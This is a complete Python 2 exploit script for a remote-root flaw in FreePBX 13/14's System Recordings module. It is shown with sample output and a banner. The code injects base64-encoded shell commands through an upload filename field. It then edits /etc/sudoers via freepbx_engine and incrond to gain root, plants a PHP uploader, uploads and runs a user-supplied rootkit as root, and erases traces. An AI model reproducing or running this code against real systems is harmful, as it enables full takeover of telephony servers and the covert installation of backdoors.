# -*- coding, latin-1 -*- ######################################################
#                                                                              #
# DESCRIPTION                                                                  #
# FreePBX 13 remote root 0day - Found and exploited by pgt @ nullsecurity.net  #
#                                                                              #
# AUTHOR                                                                       #
# pgt - nullsecurity.net                                                       #
#                                                                              #
# DATE                                                                         #
# 8-12-2016                                                                    #
#                                                                              #
# VERSION                                                                      #
# freepbx0day.py 0.1                                                           #
#                                                                              #
# AFFECTED VERSIONS                                                            #
# FreePBX 13 & 14 (System Recordings Module versions: 13.0.1beta1 - 13.0.26)   #
#                                                                              #
# STATUS                                                                       #
# Fixed 08-10-2016 - http://issues.freepbx.org/browse/FREEPBX-12908            #
#                                                                              #
# TESTED AGAINST                                                               #
# * http://downloads.freepbxdistro.org/ISO/FreePBX-64bit-10.13.66.iso          #
# * http://downloads.freepbxdistro.org/ISO/FreePBX-32bit-10.13.66.iso          #
#                                                                              #
# TODO                                                                         #
# * SSL support (priv8)                                                        #
# * parameter for TCP port                                                     #
#                                                                              #
# HINT                                                                         #
# Base64 Badchars: &#039;+&#039;, &#039;/&#039;, &#039;=&#039;                                               #
#                                                                              #
################################################################################
 
&#039;&#039;&#039;
Successful exploitation should looks like:
 
[*] enum FreePBX version
[+] target running FreePBX 13
[*] checking if target is vulnerable
[+] target seems to be vulnerable
[*] getting kernel version
[!] Kernel: Linux localhost.localdomain 2.6.32-504.8.1.el6.x86_64 ....
[+] Linux x86_64 platform
[*] adding &#039;echo "asterisk ALL=(ALL) NOPASSWD:...&#039; to freepbx_engine
[*] triggering incrond to gaining root permissions via sudo
[*] waiting 20 seconds while incrond restarts applications - /_!_\ VERY LOUD!
[*] removing &#039;echo "asterisk ALL=(ALL) NOPASSWD:...&#039; from freepbx_engine
[*] checking if we gained root permissions
[!] w00tw00t w3 r r00t - uid=0(root) gid=0(root) groups=0(root)
[+] adding view.php to admin/.htaccess
[*] creating upload script: admin/libraries/view.php
[*] uploading ${YOUR_ROOTKIT} to /tmp/23 via admin/libraries/view.php
[*] removing view.php from admin/.htaccess
[*] rm -f admin/libraries/view.php
[!] execute: chmod +x /tmp/23; sudo /tmp/23 & sleep 0.1; rm -f /tmp/23
[*] removing &#039;asterisk ALL=(ALL) NOPASSWD:ALL&#039; from /etc/sudoers
[*] removing all temp files
[!] have fun and HACK THE PLANET!
&#039;&#039;&#039;
 
 
import base64
import httplib
import optparse
import re
from socket import *
import sys
import time
 
 
BANNER = &#039;&#039;&#039;\033[0;31m
################################################################################
#___________                    ________________________  ___   ____________   #
#\_   _____/______   ____   ____\______   \______   \   \/  /  /_   \_____  \  #
# |    __) \_  __ \_/ __ \_/ __ \|     ___/|    |  _/\     /    |   | _(__  <  #
# |     \   |  | \/\  ___/\  ___/|    |    |    |   \/     \    |   |/       \ #
# \___  /   |__|    \___  >\___  >____|    |______  /___/\  \   |___/______  / #
#     \/                \/     \/                 \/      \_/              \/  #
#  _______                .___                                                 #
#  \   _  \             __| _/____  ___.__.   * Remote Root 0-Day              #
#  /  /_\  \   ______  / __ |\__  \<   |  |                                    #
#  \  \_/   \ /_____/ / /_/ | / __ \ \___ |                                    #
#   \_____  /         \____ |(____  / ____|                                    #
#         \/               \/     \/\/                                         #
#                                                                              #
#       * Remote Command Execution Exploit (FreePBX 14 is affected also)       #
#       * Local Root Exploit (probably FreePBX 14 is also exploitable)         #
#       * Backdoor Upload + Execute As Root                                    #
#                                                                              #
#       * Author: pgt - nullsecurity.net                                       #
#       * Version: 0.1                                                         #
#                                                                              #
################################################################################
\033[0;m&#039;&#039;&#039;
 
 
def argspage():
    parser = optparse.OptionParser()
 
    parser.add_option(&#039;-u&#039;, default=False, metavar=&#039;<url>&#039;,
            help=&#039;ip/url to exploit&#039;)
    parser.add_option(&#039;-r&#039;, default=False, metavar=&#039;<file>&#039;,
            help=&#039;Linux 32bit bd/rootkit&#039;)
    parser.add_option(&#039;-R&#039;, default=False, metavar=&#039;<file>&#039;,
            help=&#039;Linux 64bit bd/rootkit&#039;)
    parser.add_option(&#039;-a&#039;, default=&#039;/&#039;, metavar=&#039;<path>&#039;,
            help=&#039;FreePBX path - default: \&#039;/\&#039;&#039;)
 
    args, args2 = parser.parse_args()
 
    if (args.u == False) or (args.r == False) or (args.R == False):
        print &#039;&#039;
        parser.print_help()
        print &#039;\n&#039;
        exit(0)
 
    return args
 
 
def cleanup_fe():
    print &#039;[*] removing \&#039;echo "asterisk ALL=(ALL) NOPASSWD:...&#039; \
            &#039;\&#039; from freepbx_engine&#039;
    cmd = &#039;sed -i --  \&#039; /echo \"asterisk ALL=(ALL)  NOPASSWD\:ALL\">>&#039; \
            &#039;\/etc\/sudoers/d\&#039; /var/lib/asterisk/bin/freepbx_engine&#039;
    command_execution(cmd)
 
    return
 
 
def cleanup_lr():
    print &#039;[*] removing \&#039;echo "asterisk ALL=(ALL) NOPASSWD:...&#039; \
            &#039;\&#039; from launch-restapps&#039;
    cmd = &#039;sed -i -- \&#039;:r;$!{N;br};s/\\necho "asterisk.*//g\&#039; &#039; \
            &#039;modules/restapps/launch-restapps.sh&#039;
    command_execution(cmd)
 
    return
 
 
def cleanup_htaccess():
    print &#039;[*] removing view.php from admin/.htaccess&#039;
    cmd = &#039;sed -i -- \&#039;s/config\\\\.php|view\\\\.php|ajax\\\\.php/&#039; \
            &#039;config\\\\.php|ajax\\\\.php/g\&#039; .htaccess&#039;
    command_execution(cmd)
 
    return
 
 
def cleanup_view_php():
    print &#039;[*] rm -f admin/libraries/view.php&#039;
    cmd = &#039;rm -f libraries/view.php&#039;
    command_execution(cmd)
 
    return
 
 
def cleanup_sudoers():
    print &#039;[*] removing \&#039;asterisk ALL=(ALL) NOPASSWD:ALL\&#039; from /etc/sudoers&#039;
    cmd = &#039;sudo sed -i -- \&#039;/asterisk ALL=(ALL)  NOPASSWD:ALL/d\&#039; /etc/sudoers&#039;
    command_execution(cmd)
 
    return
 
 
def cleanup_tmpfiles():
    print &#039;[*] removing all temp files&#039;
    cmd = &#039;find / -name *w00t* -exec rm -f {} \; 2> /dev/null&#039;
    command_execution(cmd)
 
    return
 
 
def check_platform(response):
    if (response.find(&#039;Linux&#039;) != -1) and (response.find(&#039;x86_64&#039;) != -1):
        print &#039;[+] Linux x86_64 platform&#039;
        return &#039;64&#039;
    elif (response.find(&#039;Linux&#039;) != -1) and (response.find(&#039;i686&#039;) != -1):
        print &#039;[+] Linux i686 platform&#039;
        cleanup_tmpfiles()
        sys.exit(1)
        return &#039;32&#039;
    else:
        print &#039;[-] adjust check_platform() when you want to backdoor &#039; \
                &#039;other platforms&#039;
        cleanup_tmpfiles()
        sys.exit(1)
 
 
def check_kernel(response):
    if response.find(&#039;w00t&#039;) != -1:
        start = response.find(&#039;w00t&#039;) + 4
        end = response.find(&#039;w00tw00t&#039;) - 1
        print &#039;[!] Kernel: %s&#039; % (response[start:end].replace(&#039;\\&#039;, &#039;&#039;))
 
        return check_platform(response[start:end])
 
 
def check_root(response):
    if response.find(&#039;uid=0(root)&#039;) != -1:
        start = response.find(&#039;w00t&#039;) + 4
        end = response.find(&#039;w00tw00t&#039;) - 2
        print &#039;[!] w00tw00t w3 r r00t - %s&#039; % (response[start:end])
        return
    else:
        print &#039;[-] we are not root :(&#039;
        cleanup_fe()
        cleanup_lr()
        cleanup_tmpfiles()
        sys.exit(1)
 
 
def build_request(filename):
    body = &#039;file=%s&name=a&codec=gsm&lang=ru&temporary=1&#039; \
            &#039;&command=convert&module=recordings&#039; % (filename)
    content_type = &#039;application/x-www-form-urlencoded; charset=UTF-8&#039;
 
    return content_type, body
 
 
def filter_filename(response):
    start = response.find(&#039;localfilename":"w00t&#039;) + 16
    end = response.find(&#039;.wav&#039;) + 4
 
    return response[start:end]
 
 
def post(path, content_type, body):
    h = httplib.HTTP(ARGS.u)
    h.putrequest(&#039;POST&#039;, &#039;%s%s&#039; % (ARGS.a, path))
    h.putheader(&#039;Host&#039; , &#039;%s&#039; % (ARGS.u))
    h.putheader(&#039;Referer&#039; , &#039;http://%s/&#039; % (ARGS.u))
    h.putheader(&#039;Content-Type&#039;, content_type)
    h.putheader(&#039;Content-Length&#039;, str(len(body)))
    h.endheaders()
    h.send(body)
    errcode, errmsg, headers = h.getreply()
 
    return h.file.read()
 
 
def encode_multipart_formdata(fields, filename=None):
    LIMIT = &#039;----------lImIt_of_THE_fIle_eW_$&#039;
    CRLF = &#039;\r\n&#039;
    L = []
    L.append(&#039;--&#039; + LIMIT)
    if fields:
        for (key, value) in fields.items():
            L.append(&#039;Content-Disposition: form-data; name="%s"&#039; % key)
            L.append(&#039;&#039;)
            L.append(value)
            L.append(&#039;--&#039; + LIMIT)
 
    if filename == None:
        L.append(&#039;Content-Disposition: form-data; name="file"; filename="dasd"&#039;)
        L.append(&#039;Content-Type: audio/mpeg&#039;)
        L.append(&#039;&#039;)
        L.append(&#039;da&#039;)
    else:
        L.append(&#039;Content-Disposition: form-data; name="file"; filename="dasd"&#039;)
        L.append(&#039;Content-Type: application/octet-stream&#039;)
        L.append(&#039;&#039;)
        L.append(open_file(filename))
 
    L.append(&#039;--&#039; + LIMIT + &#039;--&#039;)
    L.append(&#039;&#039;)
    body = CRLF.join(L)
    content_type = &#039;multipart/form-data; boundary=%s&#039; % (LIMIT)
 
    return content_type, body
 
 
def create_fields(payload):
    fields = {&#039;id&#039;: &#039;1&#039;, &#039;name&#039;: &#039;aaaa&#039;, &#039;extension&#039;: &#039;0&#039;, &#039;language&#039;: &#039;ru&#039;,
            &#039;systemrecording&#039;: &#039;&#039;, &#039;filename&#039;: &#039;w00t%s&#039; % (payload)}
 
    return fields
 
 
def command_execution(cmd):
    upload_path = &#039;admin/ajax.php?module=recordings&command=&#039; \
            &#039;savebrowserrecording&#039;
    cmd = base64.b64encode(cmd)
    payload = &#039;`echo %s | base64 -d | sh`&#039; % (cmd)
    fields = create_fields(payload)
    content_type, body = encode_multipart_formdata(fields)
    response = post(upload_path, content_type, body)
    filename = filter_filename(response)
    content_type, body = build_request(filename)
 
    return post(&#039;admin/ajax.php&#039;, content_type, body)
 
 
def check_vuln():
    h = httplib.HTTP(ARGS.u)
    h.putrequest(&#039;GET&#039;, &#039;%sadmin/ajax.php&#039; % (ARGS.a))
    h.putheader(&#039;Host&#039; , &#039;%s&#039; % (ARGS.u))
    h.endheaders()
    errcode, errmsg, headers = h.getreply()
    response = h.file.read()
 
    if response.find(&#039;{"error":"ajaxRequest declined - Referrer"}&#039;) == -1:
        print &#039;[-] target seems not to be vulnerable&#039;
        sys.exit(1)
 
    upload_path = &#039;admin/ajax.php?module=recordings&command&#039; \
            &#039;=savebrowserrecording&#039;
    payload = &#039;w00tw00t&#039;
    fields = create_fields(payload)
    content_type, body = encode_multipart_formdata(fields)
    response = post(upload_path, content_type, body)
 
    if response.find(&#039;localfilename":"w00tw00tw00t&#039;) != -1:
        print &#039;[+] target seems to be vulnerable&#039;
        return
    else:
        print &#039;[-] target seems not to be vulnerable&#039;
        sys.exit(1)
 
 
def open_file(filename):
    try:
        f = open(filename, &#039;rb&#039;)
        file_content = f.read()
        f.close()
        return file_content
    except IOError:
        print &#039;[-] %s does not exists!&#039; % (filename)
        sys.exit(1)
 
 
def version13():
    print &#039;[*] checking if target is vulnerable&#039;
    check_vuln()
 
    print &#039;[*] getting kernel version&#039;
    cmd = &#039;uname -a; echo w00tw00t&#039;
    response = command_execution(cmd)
    result = check_kernel(response)
    if result == &#039;64&#039;:
        backdoor = ARGS.R
    elif result == &#039;32&#039;:
        backdoor = ARGS.r
 
    print &#039;[*] adding \&#039;echo "asterisk ALL=(ALL) NOPASSWD:...\&#039; &#039; \
            &#039;to freepbx_engine&#039;
    cmd = &#039;sed -i -- \&#039;s/Com Inc./Com Inc.\\necho "asterisk ALL=\(ALL\)\  &#039; \
            &#039;NOPASSWD\:ALL"\>\>\/etc\/sudoers/g\&#039; /var/lib/&#039; \
            &#039;asterisk/bin/freepbx_engine&#039;
    command_execution(cmd)
 
 
    print &#039;[*] triggering incrond to gaining root permissions via sudo&#039;
    cmd = &#039;echo a > /var/spool/asterisk/sysadmin/amportal_restart&#039;
    command_execution(cmd)
 
    print &#039;[*] waiting 20 seconds while incrond restarts applications&#039; \
            &#039; - /_!_\\ VERY LOUD!&#039;
    time.sleep(20)
 
    cleanup_fe()
    #cleanup_lr()
 
    print &#039;[*] checking if we gained root permissions&#039;
    cmd = &#039;sudo -n id; echo w00tw00t&#039;
    response = command_execution(cmd)
    check_root(response)
 
    print &#039;[+] adding view.php to admin/.htaccess&#039;
    cmd = &#039;sed -i -- \&#039;s/config\\\\.php|ajax\\\\.php/&#039; \
            &#039;config\\\\.php|view\\\\.php|ajax\\\\.php/g\&#039; .htaccess&#039;
    command_execution(cmd)
 
    print &#039;[*] creating upload script: admin/libraries/view.php&#039;
    cmd = &#039;echo \&#039;<?php  move_uploaded_file($_FILES["file"]&#039; \
            &#039;["tmp_name"], "/tmp/23");?>\&#039; > libraries/view.php&#039;
    command_execution(cmd)
 
    print &#039;[*] uploading %s to /tmp/23 via &#039; \
            &#039;admin/libraries/view.php&#039; % (backdoor)
    content_type, body = encode_multipart_formdata(False, backdoor)
    post(&#039;admin/libraries/view.php&#039;, content_type, body)
 
    cleanup_htaccess()
    cleanup_view_php()
 
    print &#039;[!] execute: chmod +x /tmp/23; sudo /tmp/23 & sleep 0.1;&#039; \
            &#039; rm -f /tmp/23&#039;
    cmd = &#039;chmod +x /tmp/23; sudo /tmp/23 & sleep 0.1; rm -f /tmp/23&#039;
    setdefaulttimeout(5)
    try:
        command_execution(cmd)
    except timeout:
        &#039;&#039;&#039; l4zY w0rk &#039;&#039;&#039;
 
    setdefaulttimeout(20)
    try:
        cleanup_sudoers()
        cleanup_tmpfiles()
    except timeout:
        cleanup_tmpfiles()
 
    return
 
 
def enum_version():
    h = httplib.HTTP(ARGS.u)
    h.putrequest(&#039;GET&#039;, &#039;%sadmin/config.php&#039; % (ARGS.a))
    h.putheader(&#039;Host&#039; , &#039;%s&#039; % (ARGS.u))
    h.endheaders()
    errcode, errmsg, headers = h.getreply()
    response = h.file.read()
 
    if response.find(&#039;FreePBX 13&#039;) != -1:
        print &#039;[+] target running FreePBX 13&#039;
        return 13
    else:
        print &#039;[-] target is not running FreePBX 13&#039;
 
    return False
 
 
def checktarget():
    if re.match(r&#039;^[0-9.\-]*$&#039;, ARGS.u):
        target = ARGS.u
    else:
        try:
            target = gethostbyname(ARGS.u)
        except gaierror:
            print &#039;[-] \&#039;%s\&#039; is unreachable&#039; % (ARGS.u)
 
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((target, 80))
    sock.close()
    if result != 0:
        &#039;[-] \&#039;%s\&#039; is unreachable&#039; % (ARGS.u)
        sys.exit(1)
 
    return
 
def main():
    print BANNER
 
    checktarget()
 
    open_file(ARGS.r)
    open_file(ARGS.R)
 
    print &#039;[*] enum FreePBX version&#039;
    result = enum_version()
 
    if result == 13:
        version13()
 
    print &#039;[!] have fun and HACK THE PLANET!&#039;
 
    return
 
 
if __name__ == &#039;__main__&#039;:
    ARGS = argspage()
    try:
        main()
    except KeyboardInterrupt:
        print &#039;\nbye bye!!!&#039;
        time.sleep(0.01)
        sys.exit(1)
 
#EOF

